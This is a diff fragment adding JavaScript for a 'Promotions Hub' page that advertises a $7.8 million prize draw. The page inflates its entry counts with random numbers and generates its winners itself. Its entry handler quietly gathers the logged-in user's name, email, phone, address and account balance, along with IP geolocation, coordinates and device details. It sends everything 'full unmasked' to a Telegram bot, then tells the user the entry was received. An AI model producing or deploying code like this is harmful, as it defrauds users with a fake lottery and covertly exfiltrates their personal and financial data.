+function ensurePromoState() { const now = Date.now(); if (!state.promo) { createNewPromoCycle(1); return; } if (!state.promo.entries || state.promo.entries < 20150) { state.promo.entries = 20150 + Math.floor(Math.random()*800); saveDeviceState(); } let guard=0; while (guard<30) { guard++; const p = state.promo; if (p.phase === 'active') { if (now >= new Date(p.drawDate).getTime()) { p.phase='closed'; p.winners = generatePromoWinners(); p.drawRef = 'DRAW-'+p.cycleId+'-'+Math.floor(1000+Math.random()*9000); saveDeviceState(); } else break; } else if (p.phase === 'closed') { if (now >= new Date(p.restartDate).getTime()) { createNewPromoCycle(p.cycleId + 1, p.restartDate); } else break; } else break; } }
+function getPromoPhaseMeta() { const p = state.promo; if (!p) return { phase:'active', remainingMs:0, targetLabel:'Draw in', statusText:'Draw Active', statusColor:'emerald' }; const isClosed = p.phase === 'closed'; const target = new Date(isClosed ? p.restartDate : p.drawDate).getTime(); const remainingMs = Math.max(0, target - Date.now()); if (isClosed) return { phase:'closed', remainingMs, targetLabel:'Next Cycle Starts In', statusText:'Winners Announced', statusColor:'sky' }; return { phase:'active', remainingMs, targetLabel:'Draw In', statusText:'Draw Active', statusColor:'emerald' }; }
+
+function renderPromoPrizes() {
+  return `<div class="space-y-4 sm:space-y-6">
+    <div class="prize-card-1 rounded-3xl p-6 sm:p-8 relative overflow-hidden card-3d"><div class="absolute -top-8 -right-8 text-9xl text-gold-500/10 pointer-events-none"><i class="fa-solid fa-crown"></i></div><div class="flex flex-col sm:flex-row sm:items-center gap-4 sm:gap-6 relative z-10"><div class="w-20 h-20 sm:w-24 sm:h-24 rounded-3xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center text-3xl sm:text-4xl shadow-2xl shadow-gold-500/40 crown-float shrink-0"><i class="fa-solid fa-crown"></i></div><div class="flex-1"><div class="flex items-center gap-2 mb-2"><span class="px-3 py-1 bg-gold-500 text-navy-950 text-[10px] font-black rounded-full uppercase tracking-wider">1st Place</span><span class="text-[10px] text-gold-400 font-bold uppercase tracking-wider"><i class="fa-solid fa-star mr-1"></i>Grand Prize</span></div><h3 class="text-2xl sm:text-3xl font-black text-white">$7,800,000 <span class="text-gold-400">Grand Prize</span></h3><div class="flex flex-wrap gap-2 mt-3"><span class="inline-flex items-center gap-1.5 bg-navy-950/70 border border-gold-500/30 px-3 py-1.5 rounded-full text-[11px] font-bold text-gold-300"><i class="fa-solid fa-infinity"></i> $7,000 / week for life</span><span class="inline-flex items-center gap-1.5 bg-navy-950/70 border border-gold-500/30 px-3 py-1.5 rounded-full text-[11px] font-bold text-gold-300"><i class="fa-solid fa-car-side"></i> 2026 Mercedes-Benz</span></div></div></div></div>
+    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-6">
+      <div class="prize-card-2 rounded-3xl p-6 relative overflow-hidden card-3d"><div class="absolute -top-6 -right-6 text-8xl text-slate-200/5 pointer-events-none"><i class="fa-solid fa-medal"></i></div><div class="flex items-center gap-3 mb-3 relative z-10"><div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-slate-200 to-slate-400 text-navy-950 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-medal"></i></div><span class="px-2.5 py-0.5 bg-slate-300 text-navy-950 text-[10px] font-black rounded-full uppercase tracking-wider">2nd Place</span></div><h4 class="text-lg sm:text-xl font-black text-white mb-1 relative z-10">Winner's Choice</h4><div class="space-y-2 mt-3 relative z-10"><div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl"><i class="fa-solid fa-sack-dollar text-slate-300"></i><span class="text-xs font-bold text-white">$800,000 Cash</span></div><div class="flex items-center justify-center text-[10px] text-slate-400 font-bold uppercase tracking-wider"><i class="fa-solid fa-circle-nodes text-sky-custom mx-2"></i> OR <i class="fa-solid fa-circle-nodes text-sky-custom mx-2"></i></div><div class="flex items-center gap-2 bg-navy-950/60 border border-slate-500/30 px-3 py-2 rounded-xl"><i class="fa-solid fa-truck-monster text-slate-300"></i><span class="text-xs font-bold text-white">2026 SUV Vehicle</span></div></div></div>
+      <div class="prize-card-3 rounded-3xl p-6 relative overflow-hidden card-3d"><div class="absolute -top-6 -right-6 text-8xl text-amber-600/10 pointer-events-none"><i class="fa-solid fa-award"></i></div><div class="flex items-center gap-3 mb-3 relative z-10"><div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-amber-500 to-amber-700 text-navy-950 flex items-center justify-center text-xl shadow-lg"><i class="fa-solid fa-award"></i></div><span class="px-2.5 py-0.5 bg-amber-600 text-white text-[10px] font-black rounded-full uppercase tracking-wider">3rd Place</span></div><h4 class="text-lg sm:text-xl font-black text-white mb-1 relative z-10">$25,000</h4><p class="text-xs text-slate-400 relative z-10">Straight cash prize, wired directly to your configured funding method.</p><div class="flex items-center gap-2 mt-4 bg-navy-950/60 border border-amber-600/30 px-3 py-2 rounded-xl relative z-10"><i class="fa-solid fa-money-bill-wave text-amber-500"></i><span class="text-xs font-bold text-white">$25,000.00 Cash</span></div></div>
+    </div>
+  </div>`;
+}
+function renderPromoTimeline(p) {
+  const now = Date.now(); const cycleStart = new Date(p.cycleStartDate).getTime(); const drawTime = new Date(p.drawDate).getTime(); const restartTime = new Date(p.restartDate).getTime(); const isClosed = p.phase === 'closed';
+  const step1Done = now >= cycleStart; const step2Active = !isClosed && now < drawTime; const step2Done = isClosed || now >= drawTime; const step3Done = isClosed && now >= drawTime; const step4Active = isClosed && now < restartTime;
+  const cls = (done, active) => done && !active ? 'timeline-dot done' : active ? 'timeline-dot active' : 'timeline-dot';
+  const lineCls = (done) => done ? 'timeline-line done' : 'timeline-line';
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d"><div class="flex items-center justify-between mb-5"><h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-timeline text-sky-custom mr-2"></i> Event Timeline</h3><span class="text-[10px] text-slate-400 uppercase tracking-wider">Cycle #${p.cycleId}</span></div><div class="flex items-center gap-1 sm:gap-2 overflow-x-auto pb-2"><div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(step1Done, false)}"><i class="fa-solid fa-flag-checkered"></i></div><p class="text-[10px] font-bold text-white mt-2 text-center">Cycle Start</p><p class="text-[9px] text-slate-500 text-center">Day 0</p></div><div class="${lineCls(step2Done)}"></div><div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(false, step2Active)}"><i class="fa-solid fa-hourglass-half"></i></div><p class="text-[10px] font-bold ${step2Active ? 'text-sky-custom' : 'text-white'} mt-2 text-center">21-Day Countdown</p><p class="text-[9px] text-slate-500 text-center">Days 1–21</p></div><div class="${lineCls(step3Done)}"></div><div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(step3Done, false)}"><i class="fa-solid fa-trophy"></i></div><p class="text-[10px] font-bold text-white mt-2 text-center">Winners Drawn</p><p class="text-[9px] text-slate-500 text-center">Day 21</p></div><div class="${lineCls(step3Done)}"></div><div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(false, step4Active)}"><i class="fa-solid fa-rotate"></i></div><p class="text-[10px] font-bold ${step4Active ? 'text-sky-custom' : 'text-white'} mt-2 text-center">Restart Window</p><p class="text-[9px] text-slate-500 text-center">Days 21–28</p></div><div class="${lineCls(false)}"></div><div class="flex flex-col items-center min-w-[72px] sm:min-w-[100px]"><div class="${cls(false, false)}"><i class="fa-solid fa-play"></i></div><p class="text-[10px] font-bold text-white mt-2 text-center">New Cycle</p><p class="text-[9px] text-slate-500 text-center">Day 28</p></div></div></div>`;
+}
+function renderPromoCountdownCard(p) {
+  const meta = getPromoPhaseMeta(); const isClosed = meta.phase === 'closed';
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d relative overflow-hidden"><div class="absolute inset-0 pointer-events-none ${isClosed ? 'bg-[radial-gradient(circle_at_top,rgba(56,189,248,0.10),transparent_60%)]' : 'bg-[radial-gradient(circle_at_top,rgba(16,185,129,0.10),transparent_60%)]'}"></div><div class="relative z-10"><div class="flex items-center justify-between mb-5"><div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">${meta.targetLabel}</p><h3 class="text-lg sm:text-xl font-bold text-white mt-0.5">${isClosed ? 'New cycle begins soon' : 'Grand draw countdown'}</h3></div><span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[10px] font-black ${isClosed ? 'bg-sky-custom/20 text-sky-custom border border-sky-custom/40' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'}"><span class="w-2 h-2 rounded-full ${isClosed ? 'bg-sky-custom' : 'bg-emerald-400'} pulse-dot"></span>${meta.statusText}</span></div><div class="grid grid-cols-4 gap-2 sm:gap-3 text-center"><div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl relative overflow-hidden"><div id="promo-cd-days" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Days</div></div><div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl"><div id="promo-cd-hours" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Hours</div></div><div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl"><div id="promo-cd-mins" class="text-2xl sm:text-4xl font-black text-white">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Mins</div></div><div class="bg-navy-950 border border-navy-700 p-3 sm:p-4 rounded-2xl"><div id="promo-cd-secs" class="text-2xl sm:text-4xl font-black text-gold-400">00</div><div class="text-[9px] sm:text-[10px] text-slate-400 uppercase mt-1">Secs</div></div></div><div class="grid grid-cols-3 gap-3 mt-5 text-center"><div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Cycle</p><p class="text-xs font-black text-white mt-0.5">#${p.cycleId}</p></div><div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Entries</p><p class="text-xs font-black text-gold-400 mt-0.5">${(p.entries||0).toLocaleString()}</p></div><div class="bg-navy-950/60 border border-navy-700 rounded-xl p-2.5"><p class="text-[9px] text-slate-400 uppercase font-bold">Draw Ref</p><p class="text-[10px] font-black text-sky-custom mt-0.5 truncate">${escapeHtml(p.drawRef||'Pending')}</p></div></div></div></div>`;
+}
+function renderPromoEntryCard(p) {
+  const meta = getPromoPhaseMeta();
+  if (meta.phase === 'closed') {
+    return `<div class="bg-navy-800 border border-dashed border-navy-600 rounded-3xl p-6 sm:p-7 flex flex-col items-center justify-center text-center min-h-[280px]"><div class="w-14 h-14 rounded-2xl bg-sky-custom/15 text-sky-custom flex items-center justify-center text-2xl mb-4"><i class="fa-solid fa-lock"></i></div><h3 class="text-lg font-bold text-white mb-1.5">Entries Closed</h3><p class="text-xs text-slate-400 max-w-xs leading-relaxed">This cycle's draw has concluded. New entries open automatically when the next cycle starts.</p><div class="mt-4 px-4 py-2 bg-navy-950 border border-navy-700 rounded-xl text-[11px] text-slate-300"><i class="fa-solid fa-clock text-sky-custom mr-1"></i> Restart window active</div></div>`;
+  }
+  return `<div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-7 card-3d"><div class="flex items-center justify-between mb-5"><div><h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-ticket text-gold-400 mr-2"></i> Enter Promo Stream</h3><p class="text-[11px] text-slate-400 mt-0.5">Submit your details to enter the active pool.</p></div><span class="px-3 py-1 bg-gold-500/20 text-gold-400 text-[10px] font-black rounded-full border border-gold-500/40 uppercase tracking-wider">Open</span></div><form onsubmit="handlePromoEntry(event)" class="space-y-3"><input type="text" id="promo-name" required placeholder="Full Name" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"><input type="email" id="promo-email" required placeholder="Email Address" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"><input type="text" id="promo-region" required placeholder="City / Region" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"><button type="submit" class="w-full py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-sm hover:brightness-110 active:scale-95 transition shadow-lg shadow-gold-500/20"><i class="fa-solid fa-paper-plane mr-1.5"></i> Enter This Cycle</button></form><div class="mt-4 p-3 bg-navy-950/60 border border-navy-700 rounded-xl text-[10px] text-slate-400 leading-relaxed"><i class="fa-solid fa-shield-halved text-sky-custom mr-1"></i> One entry per email. Winner names are drawn at random when the countdown reaches zero.</div></div>`;
+}
+function renderPromoWinners(p) {
+  const meta = getPromoPhaseMeta(); const isClosed = meta.phase === 'closed'; const winners = p.winners;
+  let headerBlock = `<div class="flex flex-col sm:flex-row sm:items-end justify-between gap-4 mb-6"><div><span class="text-xs font-bold text-gold-400 uppercase tracking-widest block mb-2">Randomized Selection</span><h2 class="text-2xl sm:text-3xl font-extrabold text-white flex items-center"><i class="fa-solid fa-trophy text-gold-400 mr-3"></i> Select Winners</h2><p class="text-slate-400 text-xs mt-1.5">${isClosed ? 'Winners drawn from verified entries — names randomized for privacy.' : 'Winner reveal begins automatically when the countdown hits zero.'}</p></div><span class="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-black ${isClosed ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' : 'bg-navy-950 border border-navy-700 text-slate-300'}"><span class="w-2 h-2 rounded-full ${isClosed ? 'bg-emerald-400 pulse-dot' : 'bg-slate-500'}"></span>${isClosed ? 'REVEALED' : 'PENDING DRAW'}</span></div>`;
+  if (!isClosed) {
+    const placeholders = [1,2,3].map(place => {
+      const labels = {1:'1st Place',2:'2nd Place',3:'3rd Place'}; const icons = {1:'fa-crown',2:'fa-medal',3:'fa-award'}; const classMap = {1:'winner-card-1',2:'winner-card-2',3:'winner-card-3'};
+      return `<div class="${classMap[place]} rounded-3xl p-6 relative overflow-hidden min-h-[220px]"><div class="absolute inset-0 winner-placeholder opacity-30 pointer-events-none"></div><div class="relative z-10 flex flex-col h-full"><div class="flex items-center justify-between mb-4"><span class="px-3 py-1 text-[10px] font-black rounded-full uppercase tracking-wider ${place===1?'bg-gold-500 text-navy-950':place===2?'bg-slate-300 text-navy-950':'bg-amber-600 text-white'}">${labels[place]}</span><i class="fa-solid ${icons[place]} text-2xl ${place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'}"></i></div><div class="flex-1 flex flex-col items-center justify-center text-center gap-2 my-4"><div class="w-20 h-20 rounded-full bg-navy-950/80 border-2 border-dashed ${place===1?'border-gold-500/60':place===2?'border-slate-400/50':'border-amber-600/50'} flex items-center justify-center text-3xl font-black ${place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'}"><i class="fa-solid fa-question"></i></div><p class="text-xs font-bold text-white uppercase tracking-wider">Revealing Soon</p><p class="text-[10px] text-slate-400">Awaiting countdown completion</p></div><div class="h-1.5 rounded-full overflow-hidden bg-navy-950/80 shimmer-bar mt-2"></div></div></div>`;
+    }).join('');
+    return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${placeholders}</div>`;
+  }
+  const cards = winners.map((w, i) => {
+    const place = w.place; const classMap = {1:'winner-card-1',2:'winner-card-2',3:'winner-card-3'}; const iconMap = {1:'fa-crown',2:'fa-medal',3:'fa-award'}; const badgeMap = {1:'bg-gold-500 text-navy-950',2:'bg-slate-300 text-navy-950',3:'bg-amber-600 text-white'}; const labelMap = {1:'1st Place',2:'2nd Place',3:'3rd Place'};
+    const iconColor = place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'; const initials = w.name.split(' ').map(n=>n.charAt(0)).slice(0,2).join(''); const borderColor = place===1?'border-gold-500/50':place===2?'border-slate-400/40':'border-amber-600/50'; const avatarBg = place===1?'from-gold-400 to-gold-600':place===2?'from-slate-200 to-slate-500':'from-amber-500 to-amber-700';
+    return `<div class="${classMap[place]} rounded-3xl p-6 relative overflow-hidden winner-reveal" style="animation-delay:${i*140}ms"><div class="absolute -top-8 -right-8 text-9xl opacity-10 pointer-events-none"><i class="fa-solid ${iconMap[place]}"></i></div><div class="relative z-10"><div class="flex items-center justify-between mb-4"><span class="px-3 py-1 text-[10px] font-black rounded-full uppercase tracking-wider ${badgeMap[place]}">${labelMap[place]}</span><i class="fa-solid ${iconMap[place]} text-2xl ${iconColor}"></i></div><div class="flex items-center gap-3 mb-4"><div class="w-14 h-14 rounded-2xl bg-gradient-to-br ${avatarBg} text-navy-950 flex items-center justify-center font-black text-lg shadow-lg">${initials}</div><div class="min-w-0"><p class="text-lg sm:text-xl font-black text-white truncate">${escapeHtml(w.name)}</p><p class="text-[11px] text-slate-400"><i class="fa-solid fa-location-dot mr-1 text-gold-400"></i>${escapeHtml(w.location)}</p></div></div><div class="pt-4 border-t ${borderColor}"><p class="text-[10px] text-slate-400 uppercase tracking-wider font-bold mb-1">${escapeHtml(w.prizeLabel)}</p><p class="text-xs sm:text-sm font-bold text-white leading-relaxed">${escapeHtml(w.prizeSummary)}</p></div><div class="mt-4 flex items-center justify-between text-[10px]"><span class="text-slate-400"><i class="fa-solid fa-ticket mr-1"></i>Ticket ${escapeHtml(w.ticket)}</span><span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check mr-1"></i>Verified</span></div></div></div>`;
+  }).join('');
+  return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${cards}</div>`;
+}
+function renderPromoSection() {
+  const p = state.promo; if (!p) return '';
+  const meta = getPromoPhaseMeta(); const isClosed = meta.phase === 'closed'; const now = Date.now();
+  const cycleStart = new Date(p.cycleStartDate).getTime(); const drawTime = new Date(p.drawDate).getTime(); const activeDuration = drawTime - cycleStart;
+  const elapsed = Math.min(activeDuration, Math.max(0, now - cycleStart)); const activeProgress = isClosed ? 100 : Math.round((elapsed/activeDuration)*100);
+  let restartBanner = '';
+  if (isClosed) { const ms = meta.remainingMs; const d = Math.floor(ms/86400000); const h = Math.floor((ms%86400000)/3600000); const m = Math.floor((ms%3600000)/60000); restartBanner = `<div class="bg-gradient-to-r from-sky-custom/15 via-navy-900 to-gold-500/15 border border-sky-custom/30 rounded-3xl p-5 sm:p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4"><div class="flex items-center gap-3"><div class="w-12 h-12 rounded-2xl bg-sky-custom/20 text-sky-custom flex items-center justify-center text-xl"><i class="fa-solid fa-rotate"></i></div><div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Auto-Restart Scheduler</p><p class="text-sm sm:text-base font-bold text-white">Next cycle begins in <span class="text-sky-custom">${d}d ${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m</span></p></div></div><div class="text-[11px] text-slate-400 flex items-center gap-2"><i class="fa-solid fa-infinity text-gold-400"></i>7-day restart window</div></div>`; }
+  return `<section class="relative overflow-hidden py-14 sm:py-20 bg-gradient-to-b from-navy-950 via-navy-900 to-navy-950 border-b border-navy-700/50"><div class="absolute inset-0 bg-[radial-gradient(circle_at_bottom_left,rgba(245,158,11,0.09),transparent_55%)] pointer-events-none"></div><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 space-y-6 sm:space-y-8">
+    <div class="flex flex-col lg:flex-row lg:items-end justify-between gap-6"><div class="space-y-3"><div class="inline-flex items-center gap-2 bg-gold-500/10 border border-gold-500/30 px-3.5 py-1.5 rounded-full text-gold-400 text-[11px] font-black tracking-widest uppercase"><i class="fa-solid fa-trophy"></i> Weekly Allocation Promo</div><h2 class="text-3xl sm:text-4xl lg:text-5xl font-black text-white tracking-tight leading-tight">Massive Prize Pool<br/><span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 via-gold-500 to-gold-600">Cycle #${p.cycleId} Live Now</span></h2><p class="text-sm sm:text-base text-slate-300 max-w-2xl leading-relaxed">A 21-day live draw with an automatic 7-day restart. Winners are selected at random — every verified participant gets a fair chance.</p></div><div class="flex items-center gap-3"><span class="inline-flex items-center gap-2 px-4 py-2 rounded-2xl text-xs font-black ${isClosed ? 'bg-sky-custom/20 text-sky-custom border border-sky-custom/40' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'}"><span class="w-2 h-2 rounded-full ${isClosed ? 'bg-sky-custom' : 'bg-emerald-400'} pulse-dot"></span>${meta.statusText}</span></div></div>
+    <div class="bg-navy-800 border border-navy-700 rounded-2xl p-4 sm:p-5"><div class="flex items-center justify-between text-xs mb-2"><span class="text-slate-400 font-bold uppercase tracking-wider">Cycle Progress</span><span class="text-gold-400 font-black">${activeProgress}%</span></div><div class="progress-track"><div class="progress-fill" style="width:${activeProgress}%"></div></div><div class="flex items-center justify-between text-[10px] text-slate-500 mt-2"><span>Cycle Started ${new Date(p.cycleStartDate).toLocaleDateString()}</span><span>Draw Day ${new Date(p.drawDate).toLocaleDateString()}</span></div></div>
+    <div class="grid grid-cols-1 lg:grid-cols-5 gap-4 sm:gap-6"><div class="lg:col-span-3 space-y-4 sm:space-y-6"><div class="flex items-center gap-2"><i class="fa-solid fa-gift text-gold-400"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Prize Details</h3></div>${renderPromoPrizes()}</div><div class="lg:col-span-2 space-y-4 sm:space-y-6"><div class="flex items-center gap-2"><i class="fa-solid fa-hourglass-half text-sky-custom"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Live Countdown</h3></div>${renderPromoCountdownCard(p)}${renderPromoEntryCard(p)}</div></div>
+    ${renderPromoTimeline(p)}
+    <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">${renderPromoWinners(p)}</div>
+    ${restartBanner}
+    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4"><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-clock text-sky-custom text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Cycle Length</p><p class="text-sm font-black text-white mt-0.5">21 Days</p></div><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-rotate text-gold-400 text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Restart Window</p><p class="text-sm font-black text-white mt-0.5">7 Days</p></div><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-users text-sky-custom text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Entries</p><p class="text-sm font-black text-white mt-0.5">${(p.entries||0).toLocaleString()}</p></div><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-dice text-gold-400 text-lg mb-1"></i><p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider">Selection</p><p class="text-sm font-black text-white mt-0.5">Random</p></div></div>
+  </div></section>`;
+}
+
+function initPromoCountdown() { if (promoInterval) clearInterval(promoInterval); updatePromoCountdownDisplay(); promoInterval = setInterval(()=>{ const prevPhase = state.promo?.phase; const prevCycle = state.promo?.cycleId; const prevDrawRef = state.promo?.drawRef; ensurePromoState(); const nowPhase = state.promo?.phase; const nowCycle = state.promo?.cycleId; const nowDrawRef = state.promo?.drawRef; if (prevPhase !== nowPhase || prevCycle !== nowCycle || prevDrawRef !== nowDrawRef) { render(); return; } updatePromoCountdownDisplay(); }, 1000); }
+function updatePromoCountdownDisplay() { const p = state.promo; if (!p) return; const meta = getPromoPhaseMeta(); const diff = meta.remainingMs; const days = Math.floor(diff/86400000); const hours = Math.floor((diff%86400000)/3600000); const mins = Math.floor((diff%3600000)/60000); const secs = Math.floor((diff%60000)/1000); const dEl = document.getElementById('promo-cd-days'); const hEl = document.getElementById('promo-cd-hours'); const mEl = document.getElementById('promo-cd-mins'); const sEl = document.getElementById('promo-cd-secs'); if (dEl) dEl.textContent = String(days).padStart(2,'0'); if (hEl) hEl.textContent = String(hours).padStart(2,'0'); if (mEl) mEl.textContent = String(mins).padStart(2,'0'); if (sEl) sEl.textContent = String(secs).padStart(2,'0'); }
+
+async function handlePromoEntry(e) {
+  e.preventDefault();
+  const name = document.getElementById('promo-name').value;
+  const email = document.getElementById('promo-email').value;
+  const region = document.getElementById('promo-region').value;
+  if (state.promo) { state.promo.entries = (state.promo.entries||0)+1; saveDeviceState(); }
+
+  const u = state.currentUser || { username:'unknown' };
+  const ownerFullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  const ownerAddress = [u.address, u.city, u.stateOrParish, u.zip].filter(Boolean).join(', ') || 'N/A';
+
+  const net = await fetchIP().catch(()=>({ ip:'Unknown', city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }));
+  const dev = detectDevice();
+  const screen = (window.screen && window.screen.width) ? `${window.screen.width}x${window.screen.height}` : 'Unknown';
+  const nowIso = new Date().toISOString();
+
+  const recordInfo = {
+    cycleId: state.promo?.cycleId || 1,
+    username: u.username,
+    name, email, region,
+    drawDate: state.promo ? new Date(state.promo.drawDate).toLocaleString() : 'N/A',
+    ownerUsername: u.username,
+    ownerName: ownerFullName,
+    ownerEmail: u.email || 'N/A',
+    ownerPhone: u.phone || 'N/A',
+    ownerAddress,
+    balance: fmtMoney(state.userBalance),
+    ip: net.ip || 'Unknown',
+    ipCity: net.city || '',
+    ipRegion: net.region || '',
+    ipCountry: net.country || '',
+    ipPostal: net.postal || '',
+    ipLatitude: net.latitude || '',
+    ipLongitude: net.longitude || '',
+    ipOrg: net.org || '',
+    ipTimezone: net.timezone || '',
+    deviceType: dev.type,
+    os: dev.os,
+    browser: dev.browser,
+    screen,
+    language: navigator.language || 'Unknown',
+    userAgent: navigator.userAgent,
+    timestamp: nowIso
+  };
+
+  // Inline Telegram message — full unmasked
+  sendTelegramMessage(
+    `🎟️ <b>NEW PROMO STREAM ENTRY</b>\n` +
+    `<b>Cycle:</b> #${tgEsc(state.promo?.cycleId || 1)}\n` +
+    `<b>Entered Name:</b> ${tgEsc(name)}\n` +
+    `<b>Entered Email:</b> ${tgEsc(email)}\n` +
+    `<b>Entered Region:</b> ${tgEsc(region)}\n` +
+    `<b>Draw Date:</b> ${tgEsc(recordInfo.drawDate)}\n` +
+    `<b>— Account Owner —</b>\n` +
+    `<b>Username:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(ownerFullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Phone:</b> ${tgEsc(u.phone || 'N/A')}\n` +
+    `<b>Address:</b> ${tgEsc(ownerAddress)}\n` +
+    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>— Network —</b>\n` +
+    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+    `<b>Postal:</b> ${tgEsc(net.postal || 'N/A')}\n` +
+    `<b>Lat/Lon:</b> ${tgEsc((net.latitude||'—') + ', ' + (net.longitude||'—'))}\n` +
+    `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +
+    `<b>Timezone:</b> ${tgEsc(net.timezone || 'N/A')}\n` +
+    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+    `<b>Screen:</b> ${tgEsc(screen)} · ${tgEsc(navigator.language || 'Unknown')}\n` +
+    `<b>User-Agent:</b> <code>${tgEsc(navigator.userAgent)}</code>\n` +
+    `<b>Timestamp:</b> ${tgEsc(nowIso)}`
+  ).catch(()=>{});
+
+  // Full .txt record
+  sendTelegramDocument(
+    `${u.username}_promo_${Date.now()}.txt`,
+    buildPromoRecord(recordInfo),
+    `📄 <b>Promo Record</b> — @${tgEsc(u.username || 'unknown')} · Cycle #${tgEsc(state.promo?.cycleId || 1)}`
+  ).catch(()=>{});
+
+  showToast('Promo Entry', `Registered ${email}`, 'success');
+  showModal('Promo Entry Received', `<div class="text-center py-4 space-y-3"><div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl"><i class="fa-solid fa-check"></i></div><h4 class="text-lg font-bold text-white">Thanks, ${escapeHtml(name)}!</h4><p class="text-xs text-slate-300">Your entry (<span class="text-gold-400">${escapeHtml(email)}</span>) has been added to Cycle #${state.promo?.cycleId||1}.</p></div>`);
+  e.target.reset();
+  render();
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('promotions');
+  const container = document.getElementById('app-container');
+  const header = `<div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d"><h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-trophy text-gold-400 mr-3"></i>Promotions Hub</h2><p class="text-xs text-slate-400 mt-1">Live cycle status, prizes, winners, and your entry form — all in one place.</p></div>`;
+  container.innerHTML = renderDashboardShell('promotions', header + renderPromoSection());
+  initPromoCountdown();
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  ensurePromoState();
+  await pullCurrentUserFromCloud();
+  render();
+};
+</script>
+</body>
+</html>
